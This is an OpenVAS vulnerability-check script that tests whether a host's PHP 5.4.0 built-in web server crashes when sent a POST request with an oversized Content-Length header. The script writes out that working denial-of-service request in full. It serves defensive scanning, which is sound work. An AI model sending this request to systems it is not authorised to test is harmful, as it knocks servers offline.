###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_php_built_in_web_srv_dos_vuln.nasl 9352 2018-04-06 07:13:02Z cfischer $
#
# PHP Built-in WebServer 'Content-Length' Denial of Service Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2012 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to cause the application
  to crash, creating a denial-of-service condition.
  Impact Level: Application

  NOTE: This NVT reports, If similar vulnerability present in different
  web-server.";

tag_affected = "PHP version 5.4.0";
tag_insight = "The flaw is due to an error when processing HTTP request with a large
  'Content-Length' header value and can be exploited to cause a denial of
  service via a specially crafted packet.";
tag_solution = "Upgrade to PHP 5.4.1RC1-DEV or 5.5.0-DEV or later.
  For updates refer to http://php.net/downloads.php";
tag_summary = "This host is running PHP Built-in WebServer and is prone to denial
  of service vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902822");
  script_bugtraq_id(52704);
  script_version("$Revision: 9352 $");
  script_tag(name:"cvss_base", value:"7.8");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:13:02 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2012-03-26 15:15:15 +0530 (Mon, 26 Mar 2012)");
  script_name("PHP Built-in WebServer 'Content-Length' Denial of Service Vulnerability");
  script_xref(name : "URL" , value : "https://bugs.php.net/bug.php?id=61461");
  script_xref(name : "URL" , value : "http://www.1337day.com/exploits/17831");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/52704");
  script_xref(name : "URL" , value : "http://xforce.iss.net/xforce/xfdb/74317");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/18665");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/111163/PHP-5.4.0-Denial-Of-Service.html");
  script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2012 SecPod");
  script_family("Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "impact" , value : tag_impact);
  exit(0);
}


include("http_func.inc");

## Variable Initialization
req = "";
res = "";
port = 0;

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

if(http_is_dead(port:port))exit(0); 

## Construct attack request
req = string("POST / HTTP/1.1\r\n",
             "Content-Type: application/x-www-form-urlencoded\r\n",
             "Content-Length: 2147483638\r\n\r\n",
             "A=B\r\n");

## Send crafted request
res = http_send_recv(port:port, data:req);

## Confirm PHP Server is dead
if(http_is_dead(port:port)){
  security_message(port);
}
